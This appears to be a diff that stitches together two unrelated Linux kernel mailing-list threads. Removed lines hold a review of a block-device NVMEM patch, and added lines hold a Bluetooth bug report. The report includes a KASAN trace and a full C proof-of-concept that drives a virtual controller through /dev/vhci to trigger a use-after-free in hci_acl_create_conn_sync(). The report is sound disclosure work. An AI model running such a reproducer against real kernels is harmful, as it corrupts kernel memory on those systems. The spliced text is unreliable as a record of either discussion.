-> > > +             bytes_left -=3D to_read;
-> > > +             val +=3D to_read;
-> > > +             folio_put(folio);
-> > > +     }
-> > > +
-> > > +     return ret;
-> > > +}
-> > > +
-> > > +void blk_nvmem_add(struct block_device *bdev)
-> > > +{
-> > > +     struct device *dev =3D &bdev->bd_device;
-> > > +     struct nvmem_config config =3D {};
-> > > +
-> > > +     /* skip devices which do not have a device tree node */
-> > > +     if (!dev_of_node(dev))
-> > > +             return;
-> > > +
-> > > +     /* skip devices without an nvmem layout defined */
-> > > +     struct device_node *child __free(device_node) =3D
-> > > +             of_get_child_by_name(dev_of_node(dev), "nvmem-layout");
-> > > +     if (!child)
-> > > +             return;
-> > > +
-> > > +     /*
-> > > +      * skip block device too large to be represented as NVMEM devic=
-es,
-> > > +      * the NVMEM reg_read callback uses an unsigned int offset
-> > > +      */
-> > > +     if (bdev_nr_bytes(bdev) > UINT_MAX) {
-> > > +             dev_warn(dev, "block device too large to be an NVMEM pr=
-ovider\n");
-> > > +             return;
-> > > +     }
-> > > +
-> > > +     config.id =3D NVMEM_DEVID_NONE;
-> > > +     config.dev =3D dev;
-> > > +     config.name =3D dev_name(dev);
-> > > +     config.owner =3D THIS_MODULE;
-> > > +     config.priv =3D (void *)(uintptr_t)dev->devt;
-> > > +     config.reg_read =3D blk_nvmem_reg_read;
-> > > +     config.size =3D bdev_nr_bytes(bdev);
-> > > +     config.word_size =3D 1;
-> > > +     config.stride =3D 1;
-> > > +     config.read_only =3D true;
-> > > +     config.root_only =3D true;
-> > > +     config.ignore_wp =3D true;
-> > > +     config.of_node =3D to_of_node(dev->fwnode);
-> > > +
-> > > +     bdev->bd_nvmem =3D nvmem_register(&config);
-> > > +     if (IS_ERR(bdev->bd_nvmem)) {
-> > > +             dev_err_probe(dev, PTR_ERR(bdev->bd_nvmem),
-> > > +                           "Failed to register NVMEM device\n");
-> >
-> > Using dev_err_probe() only makes sense with a return value. Which makes=
- me
-> > think: we won't retry this after a probe deferral. I think we should re=
-turn
->
-> Yes, so here with the nvmem fixed-layout, there is no way to get a
-> deferred probe error, but better to be ready to handle this anyway.
->
-> > int from this function just for this use-case. Also: if we *do* have
-> > a layout, shouldn't we treat a failure to register the nvmem provider a=
-s
-> > a an error and propagate it up the stack?
->
-> From an API perspective we should indeed return the error. From block
-> core, Do we want to fail the entire disk addition just because the
-> 'companion' NVMEM provider couldn't be registered, or should we only
-> abort/return in case of EPROBE_DEFER?
+Hi Xiao Wu,
 
-Also we cannot safely return -EPROBE_DEFER from add_disk_final()
-either. The NVMEM registration point is late in the sequence, too much
-has already happened to easily unwind. The easiest is that the NVMEM
-simply won't be available if registration fails, which looks
-acceptable?
+On Sat, Jun 13, 2026, at 6:40 AM, XIAO WU wrote:
+> Hi Siwei,
+>
+> On Thu, 11 Jun 2026 11:19:52 -0400, Siwei Zhang wrote:
+>  > Bluetooth: hci_conn: Fix null ptr deref in hci_abort_conn()
+>
+> This patch correctly fixes the NULL dereference in hci_abort_conn() by
+> tracking in-flight create commands with HCI_CONN_CREATE.
+>
+> I noticed a Sashiko review[1] of this patch flagged that the new
+> clear_bit(HCI_CONN_CREATE, &conn->flags) calls after
+> __hci_cmd_sync_status_sk() introduce a use-after-free.=C2=A0 I wrote a=
+ PoC
+> to verify this and was able to trigger it reliably on a KASAN-enabled
+> kernel.
+>
+> The race:
+>
+>  =C2=A0 If the controller rejects the ACL connection attempt (e.g. via
+>  =C2=A0 Command Status with a non-zero status), the RX thread processe=
+s the
+>  =C2=A0 rejection in hci_cs_create_conn() =E2=86=92 hci_conn_del(), fr=
+eeing the
+>  =C2=A0 hci_conn object.=C2=A0 Shortly after, __hci_cmd_sync_status_sk=
+() returns
+>  =C2=A0 the error to hci_acl_create_conn_sync() on the hci_cmd_sync_wo=
+rk
+>  =C2=A0 worker, which then writes to the freed conn via clear_bit().
+>
+> My PoC opens /dev/vhci, creates a virtual controller that responds to
+> HCI_OP_CREATE_CONN with Command Status error 0x2e, powers on the
+> controller, and triggers an L2CAP connect.=C2=A0 This reliably hits:
+>
+> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+> BUG: KASAN: slab-use-after-free in hci_acl_create_conn_sync+0x3c6/0x600
+> Write of size 8 at addr ffff88802eed2950 by task kworker/u11:0/57
+> Workqueue: hci0 hci_cmd_sync_work
+>
+> Call Trace:
+>  =C2=A0<TASK>
+>  =C2=A0dump_stack_lvl+0x116/0x1f0
+>  =C2=A0print_report+0xf4/0x600
+>  =C2=A0kasan_report+0xe0/0x110
+>  =C2=A0kasan_check_range+0x100/0x1b0
+>  =C2=A0hci_acl_create_conn_sync+0x3c6/0x600=C2=A0 =C2=A0 <-- clear_bit=
+ on freed conn
+>  =C2=A0hci_cmd_sync_work+0x1b0/0x480
+>  =C2=A0process_one_work+0xa20/0x1c50
+>  =C2=A0worker_thread+0x6df/0xf30
+>  =C2=A0kthread+0x387/0x4a0
+>
+> Allocated by task 9349 (L2CAP connect):
+>  =C2=A0__hci_conn_add+0xfd/0x1df0
+>  =C2=A0hci_conn_add_unset+0x7b/0x130
+>  =C2=A0hci_connect_acl+0x4aa/0x7c0
+>  =C2=A0l2cap_chan_connect+0x779/0x2160
+>  =C2=A0l2cap_sock_connect+0x381/0x7a0
+>
+> Freed by task 9353 (RX thread):
+>  =C2=A0kfree+0x171/0x720
+>  =C2=A0device_release+0xd7/0x280
+>  =C2=A0hci_conn_del_sysfs+0x17b/0x1a0
+>  =C2=A0hci_conn_del+0x685/0x11d0
+>  =C2=A0hci_cs_create_conn+0x1e9/0x430=C2=A0 =C2=A0 =C2=A0<-- controlle=
+r rejection
+>  =C2=A0hci_cmd_status_evt+0x267/0x790
+>  =C2=A0hci_event_packet+0x521/0xce0
+>  =C2=A0hci_rx_work+0x2ce/0x1030
+> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+>
+> The race window:
+>
+>  =C2=A0 hci_acl_create_conn_sync()=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
+=A0hci_rx_work()
+>  =C2=A0 =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D
+>  =C2=A0 __hci_cmd_sync_status_sk(...)=C2=A0 =C2=A0 =C2=A0 =C2=A0 hci_c=
+s_create_conn()
+>  =C2=A0 =C2=A0 =E2=86=92 waiting for controller reply=C2=A0 =C2=A0 =C2=
+=A0 =C2=A0=E2=86=92 hci_conn_del()
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=
+ =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=
+=A0=E2=86=92 kfree(conn)
+>  =C2=A0 clear_bit(HCI_CONN_CREATE,
+>  =C2=A0 =C2=A0 &conn->flags);=C2=A0 =E2=86=90 UAF
+>
+> The same pattern exists in hci_le_create_conn_sync().
+>
+> One possible fix: take a reference on conn before the cmd_sync call
+> and drop it after clear_bit(), or move the clear_bit to a point where
+> the conn is still guaranteed to be alive.=C2=A0 The Sashiko review[1]
+> points out a few other issues in the same patch as well.
+>
+> I wrote the following PoC.=C2=A0 It opens /dev/vhci, emulates a contro=
+ller
+> that rejects CREATE_CONN, powers up via MGMT, and triggers an L2CAP
+> connect to exercise the race.
+>
+> ---8<--- poc.c ---
+> /*
+>  =C2=A0* PoC for UAF in hci_acl_create_conn_sync()
+>  =C2=A0*
+>  =C2=A0* Opens /dev/vhci, creates a virtual HCI controller that respon=
+ds to
+>  =C2=A0* HCI_OP_CREATE_CONN with Command Status 0x2e=20
+> (HCI_ERROR_COMMAND_DISALLOWED).
+>  =C2=A0* The RX thread processes this via hci_cs_create_conn() and fre=
+es the=20
+> conn,
+>  =C2=A0* while the hci_cmd_sync_work worker then hits the UAF in clear=
+_bit().
+>  =C2=A0*
+>  =C2=A0* Build:=C2=A0 gcc -Wall -O2 -o poc poc.c -lpthread
+>  =C2=A0* Run:=C2=A0 =C2=A0 ./poc=C2=A0 =C2=A0(root, KASAN-enabled kern=
+el, vhci loaded)
+>  =C2=A0*/
+> #define _GNU_SOURCE
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> #include <unistd.h>
+> #include <fcntl.h>
+> #include <errno.h>
+> #include <sys/socket.h>
+> #include <sys/poll.h>
+> #include <pthread.h>
+> #include <stdint.h>
+>
+> #define HCI_COMMAND_PKT 0x01
+> #define HCI_EVENT_PKT=C2=A0 =C2=A0 0x04
+> #define HCI_VENDOR_PKT=C2=A0 =C2=A00xff
+> #define HCI_EV_CMD_COMPLETE 0x0e
+> #define HCI_EV_CMD_STATUS=C2=A0 =C2=A00x0f
+> #define HCI_OP_CREATE_CONN=C2=A0 0x0405
+> #define HCI_OP_RESET=C2=A0 =C2=A0 =C2=A0 =C2=A0 0x0c03
+> #define BTPROTO_L2CAP=C2=A0 =C2=A00
+> #define BTPROTO_HCI=C2=A0 =C2=A0 =C2=A01
+> #define BDADDR_BREDR=C2=A0 =C2=A0 0x00
+> #define HCI_CHANNEL_CONTROL 3
+>
+> struct sockaddr_l2 {
+>  =C2=A0 =C2=A0 uint16_t l2_family, l2_psm;
+>  =C2=A0 =C2=A0 uint8_t=C2=A0 l2_bdaddr[6];
+>  =C2=A0 =C2=A0 uint16_t l2_cid;
+>  =C2=A0 =C2=A0 uint8_t=C2=A0 l2_bdaddr_type;
+> } __attribute__((packed));
+>
+> struct sockaddr_hci {
+>  =C2=A0 =C2=A0 uint16_t hci_family, hci_dev, hci_channel;
+> };
+>
+> static volatile int vhci_fd =3D -1;
+> static volatile int saw_conn =3D 0;
+>
+> static int send_evt(uint8_t e, const void *d, uint8_t dl)
+> {
+>  =C2=A0 =C2=A0 uint8_t b[512];
+>  =C2=A0 =C2=A0 b[0] =3D HCI_EVENT_PKT; b[1] =3D e; b[2] =3D dl;
+>  =C2=A0 =C2=A0 if (dl && d) memcpy(b + 3, d, dl);
+>  =C2=A0 =C2=A0 return write(vhci_fd, b, 3 + dl);
+> }
+>
+> static int read_cmd(uint16_t *o, uint8_t *p, int *pl, int tmo)
+> {
+>  =C2=A0 =C2=A0 uint8_t b[8192];
+>  =C2=A0 =C2=A0 struct pollfd pf =3D {.fd =3D vhci_fd, .events =3D POLL=
+IN};
+>  =C2=A0 =C2=A0 int r =3D poll(&pf, 1, tmo);
+>  =C2=A0 =C2=A0 if (r <=3D 0) return -1;
+>  =C2=A0 =C2=A0 r =3D read(vhci_fd, b, sizeof(b));
+>  =C2=A0 =C2=A0 if (r < 4 || b[0] !=3D HCI_COMMAND_PKT) return -1;
+>  =C2=A0 =C2=A0 *o =3D b[1] | (b[2] << 8); *pl =3D b[3];
+>  =C2=A0 =C2=A0 if (p && *pl) memcpy(p, b + 4, (*pl < r - 4) ? *pl : r =
+- 4);
+>  =C2=A0 =C2=A0 return 1;
+> }
+>
+> static void send_ok(uint16_t o) { uint8_t r[1] =3D {0};=20
+> send_evt(HCI_EV_CMD_COMPLETE, r, 1); }
+> static void send_cc(uint16_t o, const void *rd, uint8_t rl) {=20
+> send_evt(HCI_EV_CMD_COMPLETE, rd, rl); }
+> static void send_cs(uint16_t o, uint8_t s) {
+>  =C2=A0 =C2=A0 uint8_t p[4] =3D {s, 1, o & 0xff, (o >> 8) & 0xff};
+>  =C2=A0 =C2=A0 send_evt(HCI_EV_CMD_STATUS, p, 4);
+> }
+>
+> static void *init_thr(void *a)
+> {
+>  =C2=A0 =C2=A0 (void)a;
+>  =C2=A0 =C2=A0 uint16_t o; uint8_t p[256]; int pl;
+>  =C2=A0 =C2=A0 while (1) {
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 if (read_cmd(&o, p, &pl, 2000) < 0) { usl=
+eep(50000); continue; }
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 if (o =3D=3D HCI_OP_CREATE_CONN) {
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 /* Reject with Command Stat=
+us error 0x2e */
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 send_cs(o, 0x2e);
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 saw_conn =3D 1;
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 continue;
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 }
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 if (o =3D=3D HCI_OP_RESET) { send_ok(o); =
+continue; }
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 /* ... handle many other HCI commands for=
+ init ... */
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 send_ok(o);
+>  =C2=A0 =C2=A0 }
+>  =C2=A0 =C2=A0 return 0;
+> }
+>
+> struct mgmt_hdr { uint16_t opcode, index, len; } __attribute__((packed=
+));
+> #define MGMT_OP_SET_POWERED=C2=A0 =C2=A0 =C2=A00x0005
+> #define MGMT_OP_SET_CONNECTABLE 0x000b
+>
+> int main(void)
+> {
+>  =C2=A0 =C2=A0 printf("[*] open vhci\n");
+>  =C2=A0 =C2=A0 vhci_fd =3D open("/dev/vhci", O_RDWR);
+>  =C2=A0 =C2=A0 if (vhci_fd < 0) { perror("vhci"); return 1; }
+>  =C2=A0 =C2=A0 uint8_t c[2] =3D {HCI_VENDOR_PKT, 0}; write(vhci_fd, c,=
+ 2);
+>
+>  =C2=A0 =C2=A0 printf("[*] start vhci init thread\n");
+>  =C2=A0 =C2=A0 pthread_t t; pthread_create(&t, 0, init_thr, 0);
+>  =C2=A0 =C2=A0 sleep(6);
+>
+>  =C2=A0 =C2=A0 /* Power on via MGMT */
+>  =C2=A0 =C2=A0 int mgmt =3D socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI=
+);
+>  =C2=A0 =C2=A0 if (mgmt >=3D 0) {
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 struct sockaddr_hci ha =3D {AF_BLUETOOTH,=
+ 0xffff,=20
+> HCI_CHANNEL_CONTROL};
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 if (bind(mgmt, (struct sockaddr *)&ha, si=
+zeof(ha)) =3D=3D 0) {
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 uint8_t cmd[256];
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 struct mgmt_hdr *hdr =3D (s=
+truct mgmt_hdr *)cmd;
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 hdr->opcode =3D MGMT_OP_SET=
+_POWERED; hdr->index =3D 0; hdr->len=20
+> =3D 1;
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 cmd[sizeof(*hdr)] =3D 1;
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 write(mgmt, cmd, sizeof(*hd=
+r) + 1);
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 usleep(200000);
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 hdr->opcode =3D MGMT_OP_SET=
+_CONNECTABLE;
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 write(mgmt, cmd, sizeof(*hd=
+r) + 1);
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 usleep(200000);
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 }
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 close(mgmt);
+>  =C2=A0 =C2=A0 }
+>
+>  =C2=A0 =C2=A0 /* L2CAP connect triggers hci_connect_acl =E2=86=92 hci=
+_acl_create_conn_sync */
+>  =C2=A0 =C2=A0 printf("[*] L2CAP connect (trigger)\n");
+>  =C2=A0 =C2=A0 int l2 =3D socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO=
+_L2CAP);
+>  =C2=A0 =C2=A0 if (l2 >=3D 0) {
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 struct sockaddr_l2 ba; memset(&ba, 0, siz=
+eof(ba));
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 ba.l2_family =3D AF_BLUETOOTH; ba.l2_bdad=
+dr_type =3D BDADDR_BREDR;
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 bind(l2, (struct sockaddr *)&ba, sizeof(b=
+a));
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 struct sockaddr_l2 ca; memset(&ca, 0, siz=
+eof(ca));
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 ca.l2_family =3D AF_BLUETOOTH; ca.l2_psm =
+=3D 1;
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 ca.l2_bdaddr_type =3D BDADDR_BREDR;
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 memset(ca.l2_bdaddr, 0x11, 6);
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 connect(l2, (struct sockaddr *)&ca, sizeo=
+f(ca));
+>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 close(l2);
+>  =C2=A0 =C2=A0 }
+>  =C2=A0 =C2=A0 usleep(500000);
+>  =C2=A0 =C2=A0 pthread_cancel(t); pthread_join(t, 0); close(vhci_fd);
+>  =C2=A0 =C2=A0 printf("[*] done. Check dmesg for KASAN slab-use-after-=
+free.\n");
+>  =C2=A0 =C2=A0 return 0;
+> }
+> ---8<---
+>
+> Hope this helps with the patch.=C2=A0 Let me know if you need addition=
+al
+> information from the test setup.
+>
+> [1]=20
+> https://sashiko.dev/#/patchset/20260611152039.2176565-1-oss%40fourdim.=
+xyz
 
->
-> >
-> > > +             bdev->bd_nvmem =3D NULL;
-> > > +     }
-> > > +}
-> > > +
-> > > +void blk_nvmem_del(struct block_device *bdev)
-> > > +{
-> > > +     if (bdev->bd_nvmem)
-> >
-> > Nvmem core already performs a NULL check.
->
-> Ok, thanks!
->
->
-> >
-> > > +             nvmem_unregister(bdev->bd_nvmem);
-> > > +
-> > > +     bdev->bd_nvmem =3D NULL;
-> > > +}
-> > > diff --git a/block/blk.h b/block/blk.h
-> > > index ec4674cdf2ead4fd259ff5fc42401f591e684ee9..cd3c7ca723391c40be56f=
-1dd4810e641b7c8a2b3 100644
-> > > --- a/block/blk.h
-> > > +++ b/block/blk.h
-> > > @@ -757,4 +757,12 @@ static inline void blk_debugfs_unlock(struct req=
-uest_queue *q,
-> > >       memalloc_noio_restore(memflags);
-> > >  }
-> > >
-> > > +#ifdef CONFIG_BLK_NVMEM
-> > > +void blk_nvmem_add(struct block_device *bdev);
-> > > +void blk_nvmem_del(struct block_device *bdev);
-> > > +#else
-> > > +static inline void blk_nvmem_add(struct block_device *bdev) {}
-> > > +static inline void blk_nvmem_del(struct block_device *bdev) {}
-> > > +#endif
-> > > +
-> > >  #endif /* BLK_INTERNAL_H */
-> > > diff --git a/block/genhd.c b/block/genhd.c
-> > > index 7d6854fd28e95ae9134309679a7c6a937f5b7db8..1b2382de6fb30c1e5f60f=
-45c04dc03ed3bf5d5f2 100644
-> > > --- a/block/genhd.c
-> > > +++ b/block/genhd.c
-> > > @@ -421,6 +421,8 @@ static void add_disk_final(struct gendisk *disk)
-> > >                */
-> > >               dev_set_uevent_suppress(ddev, 0);
-> > >               disk_uevent(disk, KOBJ_ADD);
-> > > +
-> > > +             blk_nvmem_add(disk->part0);
-> > >       }
-> > >
-> > >       blk_apply_bdi_limits(disk->bdi, &disk->queue->limits);
-> > > @@ -704,6 +706,8 @@ static void __del_gendisk(struct gendisk *disk)
-> > >
-> > >       disk_del_events(disk);
-> > >
-> > > +     blk_nvmem_del(disk->part0);
-> > > +
-> > >       /*
-> > >        * Prevent new openers by unlinked the bdev inode.
-> > >        */
-> > > diff --git a/include/linux/blk_types.h b/include/linux/blk_types.h
-> > > index 8808ee76e73c09e0ceaac41ba59e86fb0c4efc64..ace6f59b860d0813665b2=
-f62a1c03a1f4be94059 100644
-> > > --- a/include/linux/blk_types.h
-> > > +++ b/include/linux/blk_types.h
-> > > @@ -73,6 +73,9 @@ struct block_device {
-> > >       int                     bd_writers;
-> > >  #ifdef CONFIG_SECURITY
-> > >       void                    *bd_security;
-> > > +#endif
-> > > +#ifdef CONFIG_BLK_NVMEM
-> > > +     struct nvmem_device     *bd_nvmem;
-> > >  #endif
-> > >       /*
-> > >        * keep this out-of-line as it's both big and not needed in the=
- fast
-> > > diff --git a/include/linux/blkdev.h b/include/linux/blkdev.h
-> > > index 890128cdea1ce66863c5baa36f3b336ec4550807..f15d2b5bf9e4fd2368b8a=
-70416a978e22c0d4333 100644
-> > > --- a/include/linux/blkdev.h
-> > > +++ b/include/linux/blkdev.h
-> > > @@ -30,6 +30,7 @@
-> > >
-> > >  struct module;
-> > >  struct request_queue;
-> > > +struct nvmem_device;
-> > >  struct elevator_queue;
-> > >  struct blk_trace;
-> > >  struct request;
-> > >
-> > > --
-> > > 2.34.1
-> > >
-> > >
-> >
-> > I like this approach better than the previous one.
-> >
-> > Thanks,
-> > Bartosz
+Thanks for your review. I will send a new patch to fix this.
+I would like to add a suggested by if i have your permission.
+
+Best,
+Siwei
